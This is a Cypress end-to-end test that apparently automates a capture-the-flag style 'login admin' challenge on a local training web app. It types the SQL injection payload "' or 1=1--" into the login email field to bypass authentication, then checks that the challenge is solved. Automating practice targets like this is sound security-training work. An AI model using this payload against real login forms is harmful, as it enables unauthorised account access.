export function loginAdminChallenge(){
      
  cy.visit('http://localhost:3000/#/login').then(() => {
        
    // SQL Injection
    cy.get('#email').type("' or 1=1--");
    cy.get('#password').type("foo");
    cy.get('#loginButton').click();
      
    // Wait ContinousCode
    cy.wait(2000);
      
    // check if challenge is solved
    cy.isSolvedChallenge('loginAdminChallenge').should('eq', true);
        
  });
  
}
